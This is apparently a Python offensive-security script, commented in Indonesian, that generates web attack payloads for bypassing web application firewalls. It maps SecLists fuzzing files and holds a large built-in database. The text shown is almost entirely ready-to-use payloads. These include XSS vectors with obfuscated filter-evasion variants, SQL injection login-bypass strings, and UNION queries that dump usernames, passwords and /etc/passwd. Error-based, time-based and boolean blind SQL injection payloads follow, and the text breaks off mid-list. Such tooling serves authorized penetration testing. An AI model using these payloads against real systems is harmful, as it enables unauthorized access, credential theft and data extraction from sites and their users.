#!/usr/bin/env python3
"""
Payload Generator — Generate & obfuscate payloads untuk WAF bypass.

Script ini menggabungkan:
1. SEMUA payload dari SecLists (/usr/share/seclists/) — dibaca langsung dari file
2. Payload built-in tambahan yang tidak ada di SecLists
3. Teknik obfuscation/WAF bypass yang komprehensif

Mendukung: XSS, SQLi, SSRF, XXE, LFI, CMDi, IDOR, SSTI, SSI, LDAP, NoSQL,
           Open Redirect, CRLF Injection, Header Injection

Usage:
    python scripts/payload_generator.py --type xss --context html
    python scripts/payload_generator.py --type sqli --context generic --waf-bypass
    python scripts/payload_generator.py --type sqli --context auth_bypass
    python scripts/payload_generator.py --type sqli --context blind
    python scripts/payload_generator.py --type sqli --context mysql
    python scripts/payload_generator.py --type sqli --context mssql
    python scripts/payload_generator.py --type sqli --context oracle
    python scripts/payload_generator.py --type sqli --context nosql
    python scripts/payload_generator.py --type sqli --context polyglot
    python scripts/payload_generator.py --type ssrf
    python scripts/payload_generator.py --type xxe
    python scripts/payload_generator.py --type lfi --context linux
    python scripts/payload_generator.py --type lfi --context windows
    python scripts/payload_generator.py --type cmdi
    python scripts/payload_generator.py --type ssti
    python scripts/payload_generator.py --type ssi
    python scripts/payload_generator.py --type ldap
    python scripts/payload_generator.py --type crlf
    python scripts/payload_generator.py --type open_redirect
    python scripts/payload_generator.py --list-types
    python scripts/payload_generator.py --type xss --output payloads.txt
    python scripts/payload_generator.py --type sqli --load-seclists
    python scripts/payload_generator.py --type all --load-seclists --output all_payloads.txt

SecLists Root: /usr/share/seclists/
"""

import argparse
import base64
import random
import sys
import os
import json
from urllib.parse import quote, quote_plus


# ═══════════════════════════════════════════════════════════
# SECLISTS FILE MAPPING — Setiap file dari SecLists
# ═══════════════════════════════════════════════════════════

SECLISTS_ROOT = "/usr/share/seclists"

SECLISTS_FILES = {
    "xss": {
        "human_friendly": [
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-RSNAKE.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-Bypass-Strings-BruteLogic.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-Somdev.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-Vectors-Mario.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-EnDe-evation.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-With-Context-Jhaddix.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-OFJAAAH.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-payloadbox.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/human-friendly/xss-without-parentheses-semi-colons-portswigger.txt",
        ],
        "robot_friendly": [
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-RSNAKE.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-Somdev.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-Vectors-Mario.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-EnDe-evation.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-EnDe-mario.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-EnDe-h4k.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-EnDe-xssAttacks.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-Fuzzing.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-OFJAAAH.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-payloadbox.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/robot-friendly/xss-without-parentheses-semi-colons-portswigger.txt",
        ],
        "polyglots": [
            f"{SECLISTS_ROOT}/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/Polyglots/XSS-Polyglots-Dmiessler.txt",
            f"{SECLISTS_ROOT}/Fuzzing/XSS/Polyglots/XSS-innerht-ml.txt",
        ],
        "uri_xss": [
            f"{SECLISTS_ROOT}/Fuzzing/URI-XSS.fuzzdb.txt",
        ],
        "html5sec": [
            f"{SECLISTS_ROOT}/Fuzzing/HTML5sec-Injections-Jhaddix.txt",
        ],
    },
    "sqli": {
        "generic": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/Generic-SQLi.txt",
        ],
        "auth_bypass": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt",
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/MySQL-SQLi-Login-Bypass.fuzzdb.txt",
        ],
        "blind": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/Generic-BlindSQLi.fuzzdb.txt",
        ],
        "mysql": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/MySQL.fuzzdb.txt",
        ],
        "mssql": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/MSSQL.fuzzdb.txt",
        ],
        "oracle": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/Oracle.fuzzdb.txt",
        ],
        "quick": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/quick-SQLi.txt",
        ],
        "polyglot": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/SQLi-Polyglots.txt",
        ],
        "nosql": [
            f"{SECLISTS_ROOT}/Fuzzing/Databases/SQLi/NoSQL.txt",
        ],
        "login_bypass": [
            f"{SECLISTS_ROOT}/Fuzzing/login_bypass.txt",
        ],
    },
    "lfi": {
        "linux": [
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-Jhaddix.txt",
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt",
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt",
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt",
            f"{SECLISTS_ROOT}/Fuzzing/LFI/OMI-Agent-Linux.txt",
        ],
        "windows": [
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt",
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-Windows-adeadfed.txt",
        ],
        "huge": [
            f"{SECLISTS_ROOT}/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt",
        ],
    },
    "cmdi": {
        "all": [
            f"{SECLISTS_ROOT}/Fuzzing/command-injection-commix.txt",
        ],
        "unix": [
            f"{SECLISTS_ROOT}/Fuzzing/UnixAttacks.fuzzdb.txt",
        ],
        "windows": [
            f"{SECLISTS_ROOT}/Fuzzing/Windows-Attacks.fuzzdb.txt",
        ],
    },
    "xxe": {
        "all": [
            f"{SECLISTS_ROOT}/Fuzzing/XXE-Fuzzing.txt",
        ],
        "xml": [
            f"{SECLISTS_ROOT}/Fuzzing/XML-FUZZ.txt",
        ],
    },
    "ssti": {
        "expressions": [
            f"{SECLISTS_ROOT}/Fuzzing/template-engines-expression.txt",
        ],
        "special_vars": [
            f"{SECLISTS_ROOT}/Fuzzing/template-engines-special-vars.txt",
        ],
    },
    "ssi": {
        "all": [
            f"{SECLISTS_ROOT}/Fuzzing/SSI-Injection-Jhaddix.txt",
        ],
    },
    "ldap": {
        "all": [
            f"{SECLISTS_ROOT}/Fuzzing/LDAP.Fuzzing.txt",
        ],
    },
}


# ═══════════════════════════════════════════════════════════
# BUILT-IN PAYLOAD DATABASE
# Ini adalah payload TAMBAHAN yang tidak ada di SecLists,
# atau yang merupakan curated best-of untuk quick testing.
# ═══════════════════════════════════════════════════════════

BUILTIN_PAYLOADS = {
    "xss": {
        "html": [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert(document.domain)>',
            '<svg/onload=alert(document.domain)>',
            '<body onload=alert(document.domain)>',
            '<details open ontoggle=alert(document.domain)>',
            '<input onfocus=alert(document.domain) autofocus>',
            '<input onblur=alert(document.domain) autofocus><input autofocus>',
            '<marquee onstart=alert(document.domain)>',
            '<video><source onerror=alert(document.domain)>',
            '<video src=x onerror=alert(document.domain)>',
            '<audio src=x onerror=alert(document.domain)>',
            '<iframe srcdoc="<script>alert(parent.document.domain)</script>">',
            '<iframe src="javascript:alert(document.domain)">',
            '<object data="javascript:alert(document.domain)">',
            '<embed src="javascript:alert(document.domain)">',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id=x><animate attributeName=href values=javascript:alert(document.domain) />',
            '<isindex type=image src=x onerror=alert(document.domain)>',
            '<form><button formaction="javascript:alert(document.domain)">click',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">',
            '<select autofocus onfocus=alert(document.domain)>',
            '<textarea autofocus onfocus=alert(document.domain)>',
            '<keygen autofocus onfocus=alert(document.domain)>',
            '<frameset onload=alert(document.domain)>',
            '<table background="javascript:alert(document.domain)">',
            '<div style="width:expression(alert(document.domain))">',
            '<style>@import "javascript:alert(document.domain)"</style>',
            '"><script>alert(document.domain)</script>',
            "'><script>alert(document.domain)</script>",
            '</script><script>alert(document.domain)</script>',
            '<x onclick=alert(document.domain)>click me',
            '<x contenteditable onblur=alert(document.domain)>click and blur',
            '<a href=javascript:alert(document.domain)>click</a>',
            '<a href="javascript:void(0)" onclick=alert(document.domain)>click</a>',
            '<base href="javascript:alert(document.domain)//"><a href=x>click</a>',
            '<xss id=x onfocus=alert(document.domain) tabindex=1>#x',
            '<img src=1 onerror=alert(document.domain)>',
            '<img/src="x"onerror=alert(document.domain)>',
            '<image src=x onerror=alert(document.domain)>',
            '<img src=x onerror="javascript:alert(document.domain)">',
            "<img src=x:alert(alt) onerror=eval(src) alt=document.domain>",
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<IMG """><SCRIPT>alert(document.domain)</SCRIPT>">',
            '<IMG SRC=javascript:alert(document.domain)>',
            '<IMG SRC=JaVaScRiPt:alert(document.domain)>',
            '<IMG SRC=`javascript:alert(document.domain)`>',
            '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
            '<IMG SRC=# onmouseover="alert(document.domain)">',
            '<IMG SRC= onmouseover="alert(document.domain)">',
            '<IMG onmouseover="alert(document.domain)">',
            '<IMG SRC=/ onerror="alert(document.domain)">',
            '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
            '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
            '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
            '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
            '<BODY BACKGROUND="javascript:alert(document.domain)">',
            '<BODY ONLOAD=alert(document.domain)>',
            '<INPUT TYPE="IMAGE" SRC="javascript:alert(document.domain);">',
            '<LINK REL="stylesheet" HREF="javascript:alert(document.domain);">',
            '<TABLE BACKGROUND="javascript:alert(document.domain)">',
            '<DIV STYLE="background-image: url(javascript:alert(document.domain))">',
            '<DIV STYLE="width: expression(alert(document.domain));">',
            '<STYLE>li {list-style-image: url("javascript:alert(document.domain)");}</STYLE><UL><LI>XSS',
            '<BR SIZE="&{alert(document.domain)}">',
            '<BGSOUND SRC="javascript:alert(document.domain);">',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//\'>',
            '<svg><desc><![CDATA[</desc><script>alert(document.domain)</script>]]></svg>',
            '<svg><foreignObject><![CDATA[</foreignObject><script>alert(document.domain)</script>]]></svg>',
            '<svg><title><![CDATA[</title><script>alert(document.domain)</script>]]></svg>',
        ],
        "attribute": [
            '" onmouseover="alert(document.domain)',
            '" onfocus="alert(document.domain)" autofocus="',
            "' onmouseover='alert(document.domain)'",
            '"><script>alert(document.domain)</script>',
            "'>><script>alert(document.domain)</script>",
            '"><img src=x onerror=alert(document.domain)>',
            '"><svg onload=alert(document.domain)>',
            '" accesskey="x" onclick="alert(document.domain)" x="',
            '" onfocusin="alert(document.domain)" contenteditable',
            "' onfocus='alert(document.domain)' autofocus='",
            '" onmouseenter="alert(document.domain)',
            '" onanimationend="alert(document.domain)" style="animation-name:x"',
            '" ontransitionend="alert(document.domain)" style="transition:all 0s"',
            '" onpointerover="alert(document.domain)',
            '" onpointerenter="alert(document.domain)',
            '" ontouchstart="alert(document.domain)',
            '" oncontextmenu="alert(document.domain)',
            '" ondblclick="alert(document.domain)',
            '" onauxclick="alert(document.domain)',
            '" onwheel="alert(document.domain)',
        ],
        "javascript": [
            "';alert(document.domain)//",
            "\\';;alert(document.domain)//",
            "</script><script>alert(document.domain)</script>",
            "'-alert(document.domain)-'",
            '\\\"-alert(document.domain)//',
            "\\'-alert(document.domain)-\\'",
            "}</script><script>alert(document.domain)</script>",
            "'-alert(document.domain)+'",
            '"+alert(document.domain)+"',
            "{alert(document.domain)}",
            "{{constructor.constructor('alert(document.domain)')()}}",
            "${alert(document.domain)}",
            "<%=alert(document.domain)%>",
            "-alert(document.domain)-",
            "1;alert(document.domain)",
            "1%0aalert(document.domain)",
        ],
        "url": [
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(document.domain)</script>",
            "javascript:alert`document.domain`",
            "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
            "javascript:void(0);alert(document.domain)",
            "javas\tcript:alert(document.domain)",
            "javas%09cript:alert(document.domain)",
            "javas%0acript:alert(document.domain)",
            "javas%0dcript:alert(document.domain)",
            "java\0script:alert(document.domain)",
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;",
            "&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(document.domain)",
            "javascript:alert(document.domain)//http://example.com",
            "data:text/html;charset=UTF-7,+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-",
            "data:text/html,<svg onload=alert(document.domain)>",
        ],
        "dom": [
            "#<img src=x onerror=alert(document.domain)>",
            "#<svg onload=alert(document.domain)>",
            "?q=<script>alert(document.domain)</script>",
            "?search=<img src=x onerror=alert(document.domain)>",
            "#javascript:alert(document.domain)",
            "?redirect=javascript:alert(document.domain)",
            "?url=data:text/html,<script>alert(document.domain)</script>",
            "?callback=alert(document.domain)",
            "?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>",
            "?constructor[prototype][innerHTML]=<img src=x onerror=alert(document.domain)>",
        ],
        "waf_bypass": [
            # Case variation
            '<ScRiPt>alert(document.domain)</ScRiPt>',
            '<IMG SRC=x OnErRoR=alert(document.domain)>',
            '<SVG ONLOAD=alert(document.domain)>',
            # Without parentheses
            '<img src=x onerror=alert`document.domain`>',
            '<script>throw/a]alert${document.domain}/</script>',
            '<script>onerror=alert;throw document.domain</script>',
            '<script>{onerror=alert}throw document.domain</script>',
            # Without alert keyword
            '<img src=x onerror=confirm(document.domain)>',
            '<img src=x onerror=prompt(document.domain)>',
            '<img src=x onerror=print()>',
            '<img src=x onerror=window.alert(document.domain)>',
            '<img src=x onerror=self.alert(document.domain)>',
            '<img src=x onerror=top.alert(document.domain)>',
            '<img src=x onerror=parent.alert(document.domain)>',
            '<img src=x onerror=this.alert(document.domain)>',
            '<img src=x onerror=globalThis.alert(document.domain)>',
            # String construction
            "<img src=x onerror=window['al'+'ert'](document.domain)>",
            "<img src=x onerror=self[atob('YWxlcnQ=')](document.domain)>",
            "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>",
            '<img src=x onerror=Function(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))()>',
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))>",
            # Null bytes
            '<scr%00ipt>alert(document.domain)</scr%00ipt>',
            '<scr\x00ipt>alert(document.domain)</scr\x00ipt>',
            # Double encoding
            '%253Cscript%253Ealert(document.domain)%253C/script%253E',
            '%253Csvg%2520onload%253Dalert(document.domain)%253E',
            # Unicode
            '<script>al\u0065rt(document.domain)</script>',
            # Without spaces
            '<svg/onload=alert(document.domain)>',
            '<img/src=x/onerror=alert(document.domain)>',
            '<input/onfocus=alert(document.domain)/autofocus>',
            # Without quotes
            '<img src=x onerror=alert(document.domain)>',
            # Without closing tag
            '<script>alert(document.domain)',
            '<img src=x onerror=alert(document.domain) ',
            # Using template literals
            '<script>alert`document.domain`</script>',
            '<script>[].sort.call`${alert}document.domain`</script>',
            # Event handler variations
            '<svg onload=alert(document.domain)>',
            '<body onpageshow=alert(document.domain)>',
            '<body onhashchange=alert(document.domain)>',
            '<body onresize=alert(document.domain)>',
            '<body onscroll=alert(document.domain)>',
            '<body onfocusin=alert(document.domain)>',
            '<body onfocusout=alert(document.domain)>',
            '<body onbeforeprint=alert(document.domain)>',
            '<body onafterprint=alert(document.domain)>',
            # SVG variants
            '<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(document.domain) attributeName=x to=1>',
            '<svg><animateTransform onbegin=alert(document.domain) attributeName=transform type=rotate>',
            # Math ML
            '<math><maction actiontype=toggle><mtext>XSS</mtext><mtext>XSS<script>alert(document.domain)</script></mtext></maction></math>',
            # Mutation XSS (mXSS)
            '<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">',
            '<listing>&lt;img src=1 onerror=alert(document.domain)&gt;</listing>',
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%%0telerik%%0alert(1)//'/</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
        ],
    },
    "sqli": {
        "generic": [
            "' OR 1=1 --",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            '" OR 1=1 --',
            '" OR "1"="1',
            '" OR "1"="1"--',
            '" OR "1"="1"#',
            '" OR "1"="1"/*',
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR 1=1 --",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'#",
            "') OR ('1'='1'/*",
            '") OR 1=1 --',
            '") OR ("1"="1',
            "')) OR 1=1 --",
            '")) OR 1=1 --',
            "' OR 1 --",
            "or 1=1",
            "or 1=1--",
            "or 1=1#",
            "or 1=1/*",
            "' OR ''='",
            "' OR 1 --'",
            "' OR a=a --",
            "' OR a=a",
            "or a=a",
            "or a=a--",
            "') or ('a'='a",
            "' or 1=1 or ''='",
            "' or 'text'='text'",
            "' or 'something'='some'+'thing'",
            "' or 'text' > 't'",
            "' or 'whatever' in ('whatever')",
            "' or 2 > 1",
            "' or 2 between 1 and 3",
            "' or 0=0 --",
            "' or 0=0 #",
            "1' or '1'='1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin' or '1'='1'/*",
            "admin'or 1=1 or ''='",
            "admin' or 1=1",
            "admin' or 1=1--",
            "admin' or 1=1#",
            "admin' or 1=1/*",
            "admin') or ('1'='1",
            "admin') or ('1'='1'--",
            "admin') or ('1'='1'#",
            "admin') or ('1'='1'/*",
            "admin') or '1'='1",
            "admin') or '1'='1'--",
            "admin') or '1'='1'#",
            "admin') or '1'='1'/*",
            'admin" --',
            'admin" #',
            'admin"/*',
            'admin" or "1"="1',
            'admin" or "1"="1"--',
            'admin" or "1"="1"#',
            'admin" or "1"="1"/*',
            'admin"or 1=1 or ""="',
            'admin" or 1=1',
            'admin" or 1=1--',
            'admin" or 1=1#',
            'admin" or 1=1/*',
            'admin") or ("1"="1',
            'admin") or ("1"="1"--',
            'admin") or ("1"="1"#',
            'admin") or ("1"="1"/*',
            'admin") or "1"="1',
            'admin") or "1"="1"--',
            'admin") or "1"="1"#',
            'admin") or "1"="1"/*',
            "root' --",
            "root' #",
            "root'/*",
            "root' or '1'='1",
            "root' or '1'='1'--",
            "root' or '1'='1'#",
            "root' or '1'='1'/*",
            "root'or 1=1 or ''='",
            "root' or 1=1",
            "root' or 1=1--",
            "root' or 1=1#",
            "root' or 1=1/*",
            "root') or ('1'='1",
            "root') or ('1'='1'--",
            "root') or ('1'='1'#",
            "root') or ('1'='1'/*",
            'root" --',
            'root" #',
            'root"/*',
            'root" or "1"="1',
            'root" or "1"="1"--',
            'root" or "1"="1"#',
            'root" or "1"="1"/*',
            'root"or 1=1 or ""="',
            'root" or 1=1',
            'root" or 1=1--',
            'root" or 1=1#',
            'root" or 1=1/*',
            'root") or ("1"="1',
            'root") or ("1"="1"--',
            'root") or ("1"="1"#',
            'root") or ("1"="1"/*',
        ],
        "union": [
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
            "' UNION ALL SELECT NULL --",
            "' UNION ALL SELECT NULL,NULL --",
            "' UNION ALL SELECT NULL,NULL,NULL --",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL --",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL --",
            "' UNION SELECT 'a',NULL,NULL --",
            "' UNION SELECT NULL,'a',NULL --",
            "' UNION SELECT NULL,NULL,'a' --",
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --",
            "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --",
            "' UNION SELECT username,password,NULL FROM users --",
            "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users --",
            "' UNION SELECT @@version,NULL,NULL --",
            "' UNION SELECT user(),NULL,NULL --",
            "' UNION SELECT database(),NULL,NULL --",
            "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata --",
            "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() --",
            "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users' --",
            "' UNION SELECT load_file('/etc/passwd'),NULL,NULL --",
            "' UNION SELECT 1,load_file('/etc/passwd'),1,1,1 --",
            "' ORDER BY 1 --",
            "' ORDER BY 2 --",
            "' ORDER BY 3 --",
            "' ORDER BY 4 --",
            "' ORDER BY 5 --",
            "' ORDER BY 6 --",
            "' ORDER BY 7 --",
            "' ORDER BY 8 --",
            "' ORDER BY 9 --",
            "' ORDER BY 10 --",
            "' ORDER BY 15 --",
            "' ORDER BY 20 --",
            "' ORDER BY 50 --",
            "' ORDER BY 100 --",
        ],
        "error_based": [
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e)) --",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1) --",
            "' AND EXP(~(SELECT * FROM (SELECT version())a)) --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1) --",
            # MSSQL error-based
            "' AND 1=CONVERT(int,(SELECT @@version)) --",
            "' AND 1=CONVERT(int,(SELECT DB_NAME())) --",
            "' AND 1=CONVERT(int,(SELECT SYSTEM_USER)) --",
            # PostgreSQL error-based
            "' AND 1=CAST((SELECT version()) AS int) --",
            "' AND 1=CAST((SELECT current_user) AS int) --",
            "' AND 1=CAST((SELECT current_database()) AS int) --",
        ],
        "time_blind": [
            # MySQL
            "' AND SLEEP(5) --",
            "' AND SLEEP(5)#",
            "' AND IF(1=1,SLEEP(5),0) --",
            "' AND IF(1=2,SLEEP(5),0) --",
            "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0) --",
            "' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0) --",
            "' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0) --",
            "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --",
            "' AND (SELECT SLEEP(5)) --",
            "' OR SLEEP(5) --",
            "' OR SLEEP(5)#",
            "1) AND SLEEP(5) --",
            '") AND SLEEP(5) --',
            "') AND SLEEP(5) --",
            "1)) AND SLEEP(5) --",
            '")) AND SLEEP(5) --',
            "')) AND SLEEP(5) --",
            "' AND BENCHMARK(10000000,MD5(1)) --",
            "' AND BENCHMARK(10000000,MD5(1))#",
            "1 AND BENCHMARK(10000000,MD5(1))#",
            "' OR BENCHMARK(10000000,MD5(1))#",
            "1) AND BENCHMARK(10000000,MD5(1))#",
            '") AND BENCHMARK(10000000,MD5(1))#',
            "') AND BENCHMARK(10000000,MD5(1))#",
            "1)) AND BENCHMARK(10000000,MD5(1))#",
            # PostgreSQL
            "'; SELECT pg_sleep(5) --",
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
            "' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
            "' AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
            "1 OR pg_sleep(5) --",
            "' OR pg_sleep(5) --",
            '") OR pg_sleep(5) --',
            "') OR pg_sleep(5) --",
            "1) OR pg_sleep(5) --",
            "1)) OR pg_sleep(5) --",
            # MSSQL
            "'; WAITFOR DELAY '0:0:5' --",
            "'; WAITFOR DELAY '0:0:10' --",
            "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
            "'; IF (1=2) WAITFOR DELAY '0:0:5' --",
            ";WAITFOR DELAY '0:0:5' --",
            ");WAITFOR DELAY '0:0:5' --",
            "');WAITFOR DELAY '0:0:5' --",
            "\");WAITFOR DELAY '0:0:5' --",
            "));WAITFOR DELAY '0:0:5' --",
            "'));WAITFOR DELAY '0:0:5' --",
            "\"));WAITFOR DELAY '0:0:5' --",
        ],
        "boolean_blind": [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND 'a'='a' --",
            "' AND 'a'='b' --",
            "' AND SUBSTRING((SELECT version()),1,1)='5' --",
            "' AND SUBSTRING((SELECT version()),1,1)='8' --",
